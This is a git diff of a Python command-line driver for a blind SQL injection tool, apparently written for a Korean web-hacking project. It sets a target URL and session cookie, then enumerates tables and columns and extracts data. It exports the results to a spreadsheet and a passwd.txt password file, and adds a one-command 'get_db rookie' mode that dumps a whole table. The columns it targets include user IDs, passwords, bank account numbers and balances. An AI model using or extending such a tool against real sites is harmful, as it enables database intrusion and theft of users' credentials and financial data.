@@ -21,8 +21,7 @@ table_list=['Users','Board', 'Community', 'Notice', 'OrderStockHistory', 'Stock'
 for t in table_list:
     result.append_table(t)
 
-user_column_list = ['USER_ID','USER_PW','USER_NM','ACCESS_LEVEL','USER_BIRTH','USER_ACCOUNT_NUMBER', 'USER_BANK','ACCOUNT_BALANCE', 'USER_AGENCY','USER_TELNO']
-
+user_column_list = ['ACCESS_LEVEL']
 
 
 for c in user_column_list:
@@ -31,7 +30,7 @@ for c in user_column_list:
 
 
 #쿼리 설정 및 요청 보내기(POST)
-print(page.send_post_request())
+#print(page.send_post_request())
 
 #기본 설정 보기 
 #page.show
@@ -53,7 +52,7 @@ print(page.send_post_request())
 #binary_search(page,column_count_query)
 #letter_search(page,data_query,4)
 
-print("main 시작")
+
 #tables = get_table_infos(page)
 #get_column_infos(page,result,'ANSWER')
 #get_table_data(page,result,'ANSWER')
@@ -61,57 +60,71 @@ print("main 시작")
 state=""
 while(state != 'q'):
 
-    print("\n기능 목록")
-    print('='*25)
-    print("1. 사이트 URL 설정")
-    print("2. 사이트 SessionID 설정")
-    print("3. 공격대상 설정 보기")
+   
+    ascii_art = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⡿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⢀⣤⣦⢦⣦⡀⠀⣲⣶⠀⠀⠀⣶⡧⠀⠀⣶⡦⢐⣶⡄ ⣤⣤⠀⠀⢀⣤⡄⠀ ⠰⣶⣷⣵⠂⠀⠠⣤⣤⠀⠀⠀⣤⣄⠀⠀⠀⣀⣤⣴⣤⣄⡀⠀⠀⠀
+⠀⠀⠀⠀⠀⣿⣯⠀⠂⠀⠁⢺⣿⡂⠀⠠⣿⣟⠀⠈⢽⣿⡂⣿⣿⠂⠺⠟⠿⠿⠻⠇⣿⡯⢘⣿⡅⠀⣽⣿⠀⣠⣿⠟⠀⠀⠀⣠⣥⣬⣤⡀⠀⠨⣿⣿⣧⠀⠀⣿⣯⠀⢀⣾⡿⠋⠀⠁⠋⠃⠀⠀⠀
+⠀⠀⠀⠀⠀⣿⣷⠀⠀⠀⠀⣹⣿⡂⠀⠈⣿⣷⠀⠀⣼⣿⠅⢿⣿⡀⢠⣾⠟⢿⣶⠀⣿⣿⣬⣿⠇⠀⣿⣿⣼⣿⠋⠀⠀⠀⠀⠈⣻⣿⡏⠀⠀⠨⣿⡟⣿⣧⠀⣿⡷⠀⣸⣿⡇⠀⠀⡀⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠿⠟⠟⣿⣿⠛⠻⠟⠂⠀⠀⠈⠛⠟⠟⠛⠁⠀⣿⣿⡀⢼⣿⠀⢘⣿⡇⣿⡯⢙⣿⡇⠀⣻⣿⡟⢻⣿⡆⠀⠀⠀⢀⣿⣿⡧⠀⠀⠨⣿⡧⠈⣿⣧⣿⣟⠀⢸⣿⡇⠀⠘⠛⣿⣟⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⡀⠀⣿⣿⡀⢀⠀⢀⠀⣠⣠⣠⣠⣄⣤⣤⣢⣿⣿⠀⠘⣿⣥⣼⡿⠁⣿⣟⢨⣿⡆⠀⣿⣿⠀⠀⢹⣿⣆⠀⢀⣼⣿⣿⣿⣆⠀⠨⣿⡗⠀⠈⣿⣿⣯⠀⠈⢿⣷⣄⠀⡀⣿⡯⠀⠀⠀
+⠀⠀⠀⠈⠟⠟⠟⠟⠟⠟⠟⠟⠟⠟ ⠈⠋⠉⠉⠉⠁⠁ ⣿⣿⠁⠀⠀⠈⠈⠀⠀⣿⡗⢘⣿⡅ ⠛⠛⠀⠀⠀⠙⠟⠂⠸⠿⠿⠿⠿⠻⠀⠘⠛⠃⠀⠀⠘⠛⠓⠀⠀⠀⠙⠛⠟⠟⠛⠉⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+    print(ascii_art)
+    print("\nBlind SQL Injection Script")
+    # print("\n기능 목록")
+    # print('='*25)
+    # print("1. 사이트 URL 설정")
+    # print("2. 사이트 SessionID 설정")
+    # print("3. 공격대상 설정 보기")
 
-    print('-'*23)
-    print("4. 쿼리 요청")
-    print("5. 테이블 탐색")
-    print("6. 컬럼 탐색")
-    print("7. 테이블 내 데이터 탐색")
+    # print('-'*23)
+    # print("4. 쿼리 요청")
+    # print("5. 테이블 탐색")
+    # print("6. 컬럼 탐색")
+    # print("7. 테이블 내 데이터 탐색")
 
-    print('-'*23)
-    print("8. 테이블 정보 출력")
-    print("9. 컬럼 정보 출력")
-    print("10. 데이터 정보 출력")
-    print("11. 데이터 내보내기(.xlsx)")
-    print('='*25)
+    # print('-'*23)
+    # print("8. 테이블 정보 출력")
+    # print("9. 컬럼 정보 출력")
+    # print("10. 데이터 정보 출력")
+    # print("11. 데이터 내보내기(.xlsx)")
+    # print('='*25)
 
-    user_input = input("원하는 명령의 숫자를 입력 : ")
+    user_input = input()
 
     match user_input:
-        case '1': #사이트 URL 설정 
+        case 'set_url': #사이트 URL 설정 
             print(f"현재 URL : {page.base_url}") 
             if input("새로운 url로 변경하시겠습니까? [y/n] : ")=='y':
                 page.set_url(input("새로운 url 입력 : ")) 
                 
                 
-        case '2': #SESSIONID 설정
+        case 'set_sessionid': #SESSIONID 설정
             print(f"현재 SESSIONID : {page.cookies['JSESSIONID']}") 
             if input("SessionID를 새로 설정하시겠습니까? [y/n] : ")=='y':
                 page.set_sessionID(input("새로운 SessionID 입력 : ")) 
                 
                 
-        case '3': #공격 대상 설정 보기
+        case 'show_settings': #공격 대상 설정 보기
             page.show()
 
 
-        case '4':
+        case 'send_query': #쿼리 실행
             user_query = input("공격 대상 사이트에 실행할 쿼리(전체 검색어)를 입력 : ")
             print(f"처리 결과 : {page.send_post_request(user_query)}")
 
-        case '5':
+        case 'get table': #테이블 가져오기
             page.show()
             if input("\n현재 설정으로 테이블 탐색 시작[y/n] : ")=='y':
                 tables = getData.get_tables(page)
         
-        case '6':
+        case 'get column': #컬럼 정보 가져오기 
             page.show()
             result.show_tables()
-            user_table = input("\n컬럼을 탐색할 테이블명 입력(모든 컬럼 탐색 -> All 입력) : ")
+            user_table = input("\ntable name? ")
             if user_table=='All':
                 print("\n모든 테이블의 컬럼을 탐색")
                 for table in result.tables:
@@ -121,10 +134,10 @@ while(state != 'q'):
             else:
                 print("테이블 목록에 있는 테이블을 입력해주세요. ")
         
-        case '7':
-            page.show()
-            result.show_columns()
-            user_table = input("\n데이터 탐색을 할 테이블명 입력(모든 데이터 탐색 -> All 입력) : ")
+        case 'get data': #테이블 내 데이터 정보 가져오기
+            #page.show()
+            result.show_tables()
+            user_table = input("\ntable name? ")
             if user_table=='All':
                 print("\n모든 테이블의 데이터를 탐색")
                 for table in result.tables:
@@ -134,21 +147,48 @@ while(state != 'q'):
             else:
                 print("해당 테이블의 컬럼 탐색을 먼저 진행해주세요. ")
         
-        case '8':
+        case 'show_tables':
             result.show_tables()
 
-        case '9':
+        case 'show_columns':
             print()
             result.show_columns()
 
-        case '10':
+        case 'show_data':
             result.show_tables()
             user_table = input("데이터 출력을 원하는 테이블을 지정해주세요. ")
             result.show_data(user_table)
         
-        case '11':
+        case 'export_table':
            result.export_data_xlsx()
-           print("xlsx 파일 생성됨")
+           print("output.xlsx file created")
+
+        case 'export_passwd':
+           result.export_passwd()
+           print("passwd.txt file created")
+
+        case 'get_db rookie':
+            page.show()
+            if input("\ncontinue? [y/n] : ")=='y':
+                tables = getData.get_tables(page)
+                print("")
+                result.show_tables()
+                user_table = input("\ntable name? ")
+                if user_table in result.tables:
+                    getData.get_columns(page,result,user_table)
+                    getData.get_datas(page,result,user_table)
+                    print("Injection completed")
+
+                    result.export_data_xlsx()
+                    print("output.xlsx file created")
+
+                    result.export_passwd()
+                    print("passwd.txt file created")
+
+                else:
+                    print("Invalid table name")
+
+
 
         case _: 
             print("존재하지 않는 명령어")
